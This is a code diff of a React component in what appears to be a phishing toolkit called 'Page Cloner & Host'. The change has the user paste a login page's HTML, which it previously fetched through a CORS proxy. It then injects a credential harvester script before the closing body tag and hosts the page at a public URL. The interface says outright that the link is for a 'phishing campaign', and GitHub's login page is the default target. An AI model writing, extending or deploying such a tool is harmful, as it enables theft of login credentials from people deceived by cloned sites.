@@ -9,14 +9,15 @@ import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter }
 import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
 import { Input } from '@/components/ui/input';
 import { Button } from '@/components/ui/button';
-import { Loader2, AlertTriangle, Globe, Download, RefreshCw, Bot, Copy, Wand, StopCircle, Code, Eye } from 'lucide-react';
+import { Loader2, AlertTriangle, Globe, Download, Bot, Copy, Wand, StopCircle, Eye, Code } from 'lucide-react';
 import { hostClonedPage } from '@/ai/flows/host-cloned-page-flow';
 import { useToast } from '@/hooks/use-toast';
 import { QrCodeGenerator } from './qr-code-generator';
 import { Label } from './ui/label';
+import { Textarea } from './ui/textarea';
 
 const pageClonerSchema = z.object({
-  targetUrl: z.string().url({ message: 'Please enter a valid URL to clone.' }),
+  htmlContent: z.string().min(100, { message: 'Please paste a valid HTML document.' }),
   redirectUrl: z.string().url({ message: 'Please enter a valid URL for redirection.' }),
 });
 
@@ -69,76 +70,52 @@ const getHarvesterScript = (redirectUrl: string) => `
 
 export function LoginPageCloner() {
   const { toast } = useToast();
-  const [clonedHtml, setClonedHtml] = useState<string | null>(null);
+  const [modifiedHtml, setModifiedHtml] = useState<string | null>(null);
   const [hostedUrlId, setHostedUrlId] = useState<string | null>(null);
   const [showPreview, setShowPreview] = useState(false);
   
-  const [isCloning, setIsCloning] = useState(false);
   const [isHosting, setIsHosting] = useState(false);
-  
   const [clonerError, setClonerError] = useState<string | null>(null);
 
   const form = useForm<z.infer<typeof pageClonerSchema>>({
     resolver: zodResolver(pageClonerSchema),
     defaultValues: {
-      targetUrl: 'https://github.com/login',
+      htmlContent: '',
       redirectUrl: 'https://github.com/password_reset',
     },
   });
   
   const resetState = () => {
-      setClonedHtml(null);
+      setModifiedHtml(null);
       setHostedUrlId(null);
       setClonerError(null);
       setShowPreview(false);
   }
 
-  const onClonerSubmit = async (values: z.infer<typeof pageClonerSchema>) => {
-    setIsCloning(true);
+  const onClonerSubmit = (values: z.infer<typeof pageClonerSchema>) => {
     resetState();
-    toast({ title: "Cloning page...", description: "Fetching content via proxy..." });
-
-    const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(values.targetUrl)}`;
     
-    try {
-      const response = await fetch(proxyUrl);
-      if (!response.ok) {
-        throw new Error(`Failed to fetch page. Status: ${response.status}`);
-      }
+    let html = values.htmlContent;
+    const harvesterScript = getHarvesterScript(values.redirectUrl);
       
-      let html = await response.text();
-      
-      const harvesterScript = getHarvesterScript(values.redirectUrl);
-      
-      // Inject the credential harvester script before the closing body tag
-      if (html.includes('</body>')) {
-        html = html.replace(/<\/body>/i, `${harvesterScript}</body>`);
-      } else {
-        html += harvesterScript;
-      }
-
-      // Rewrite relative URLs to absolute URLs
-      html = html.replace(/(src|href)=["'](\/[^/])/g, `$1="${new URL(values.targetUrl).origin}$2"`);
-
-      setClonedHtml(html);
-      toast({ title: "Page Cloned Successfully", description: "A static copy of the page has been created." });
-
-    } catch (e) {
-      const errorMessage = e instanceof Error ? e.message : "An unknown error occurred.";
-      console.error("Cloning error:", e);
-      setClonerError(`Failed to clone. The CORS proxy may be blocked or the target URL is invalid. Details: ${errorMessage}`);
-    } finally {
-      setIsCloning(false);
+    // Inject the credential harvester script before the closing body tag
+    if (html.includes('</body>')) {
+      html = html.replace(/<\/body>/i, `${harvesterScript}</body>`);
+    } else {
+      html += harvesterScript;
     }
+
+    setModifiedHtml(html);
+    toast({ title: "HTML Prepared", description: "Credential harvester has been injected into the HTML." });
   };
 
   const handleHostPage = async () => {
-    if (!clonedHtml) return;
+    if (!modifiedHtml) return;
     setIsHosting(true);
     setHostedUrlId(null);
     setClonerError(null);
     try {
-      const response = await hostClonedPage({ htmlContent: clonedHtml });
+      const response = await hostClonedPage({ htmlContent: modifiedHtml });
       setHostedUrlId(response.pasteId);
       toast({ title: "Page is Live", description: "Your page is now accessible at the public URL." });
     } catch (err) {
@@ -152,15 +129,16 @@ export function LoginPageCloner() {
   
   const handleStopHosting = () => {
     resetState();
+    form.setValue('htmlContent', '');
     toast({
       title: "Hosting Deactivated",
-      description: "The public URL has been removed from this interface.",
+      description: "The public URL has been removed and the form has been reset.",
     });
   };
 
   const handleDownloadHtml = () => {
-    if (clonedHtml) {
-      const blob = new Blob([clonedHtml], { type: 'text/html' });
+    if (modifiedHtml) {
+      const blob = new Blob([modifiedHtml], { type: 'text/html' });
       const url = URL.createObjectURL(blob);
       const a = document.createElement('a');
       a.href = url;
@@ -187,28 +165,36 @@ export function LoginPageCloner() {
           <Card>
             <CardHeader>
               <CardTitle>Page Cloner & Host</CardTitle>
-              <CardDescription>Create a static clone of a login page and host it on a public URL.</CardDescription>
+              <CardDescription>Paste HTML source code to inject a credential harvester and host it.</CardDescription>
             </CardHeader>
             <CardContent>
               <Form {...form}>
                 <form onSubmit={form.handleSubmit(onClonerSubmit)} className="space-y-4">
-                  <FormField control={form.control} name="targetUrl" render={({ field }) => ( <FormItem> <FormLabel>1. Target URL to Clone</FormLabel> <FormControl><Input placeholder="https://example.com/login" {...field} /></FormControl> <FormMessage /> </FormItem> )}/>
+                  <FormField control={form.control} name="htmlContent" render={({ field }) => ( 
+                    <FormItem> 
+                      <FormLabel>1. Paste Page HTML</FormLabel>
+                      <FormControl>
+                        <Textarea placeholder="Right-click on a page, 'View Page Source', and paste the HTML here." {...field} className="h-40 font-mono" />
+                      </FormControl>
+                      <FormMessage />
+                    </FormItem> 
+                  )}/>
                   <FormField control={form.control} name="redirectUrl" render={({ field }) => ( <FormItem> <FormLabel>2. Redirect URL (after capture)</FormLabel> <FormControl><Input placeholder="https://example.com/login_failed" {...field} /></FormControl> <FormMessage /> </FormItem> )}/>
-                  <Button type="submit" disabled={isCloning} className="w-full">
-                    {isCloning ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <RefreshCw className="mr-2 h-4 w-4" />}
-                    Clone Page Content
+                  <Button type="submit">
+                    <Wand className="mr-2 h-4 w-4" />
+                    Inject Harvester
                   </Button>
                 </form>
               </Form>
             </CardContent>
-            {clonedHtml && (
+            {modifiedHtml && (
               <CardFooter className="flex-col gap-4">
                 <Button onClick={handleHostPage} disabled={isHosting} className="w-full">
                     {isHosting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Globe className="mr-2 h-4 w-4" />}
                     3. Host Page
                 </Button>
                  <Button onClick={() => setShowPreview(!showPreview)} variant="secondary" className="w-full">
-                    <Eye className="mr-2 h-4 w-4"/> {showPreview ? 'Hide' : 'Show'} Cloned Code
+                    <Eye className="mr-2 h-4 w-4"/> {showPreview ? 'Hide' : 'Show'} Injected Code
                 </Button>
                 <Button onClick={handleDownloadHtml} variant="outline" className="w-full">
                     <Download className="mr-2 h-4 w-4"/> Download HTML
@@ -232,28 +218,28 @@ export function LoginPageCloner() {
               <CardDescription>Use the public URL for your phishing campaign. Open it in a new tab to test.</CardDescription>
             </CardHeader>
             <CardContent className="w-full space-y-4">
-              {(isCloning || isHosting) && <div className="flex items-center justify-center h-96"><Loader2 className="h-8 w-8 animate-spin text-muted-foreground" /></div>}
+              {(isHosting) && <div className="flex items-center justify-center h-96"><Loader2 className="h-8 w-8 animate-spin text-muted-foreground" /></div>}
               
-              {!clonedHtml && !isCloning && !showPreview && (
+              {!modifiedHtml && !isHosting && !showPreview && (
                   <div className="h-96 flex flex-col items-center justify-center text-muted-foreground">
                       <Bot className="h-12 w-12 mb-4" />
-                      <p>Clone a page to get started.</p>
+                      <p>Paste HTML content to get started.</p>
                   </div>
               )}
               
-              {clonedHtml && !fullHostedUrl && !isHosting && !showPreview && (
+              {modifiedHtml && !fullHostedUrl && !isHosting && !showPreview && (
                   <div className="h-96 flex flex-col items-center justify-center text-muted-foreground">
                       <Globe className="h-12 w-12 mb-4" />
-                      <p>Page cloned successfully.</p>
+                      <p>HTML is ready.</p>
                       <p className="font-semibold">Click "Host Page" to get a shareable link.</p>
                   </div>
               )}
               
               {showPreview && (
                  <div className="space-y-2">
-                    <Label>Cloned HTML Code</Label>
+                    <Label>Injected HTML Code</Label>
                     <pre className="h-96 border rounded-md p-2 bg-primary/10 text-xs overflow-auto font-mono">
-                        <code>{clonedHtml}</code>
+                        <code>{modifiedHtml}</code>
                     </pre>
                 </div>
               )}
@@ -272,7 +258,7 @@ export function LoginPageCloner() {
                   <div className="flex flex-wrap gap-2">
                        <Button onClick={handleStopHosting} variant="destructive" className="flex-grow">
                           <StopCircle className="mr-2 h-4 w-4" />
-                          Stop Hosting
+                          Stop Hosting & Reset
                       </Button>
                   </div>
                 </div>
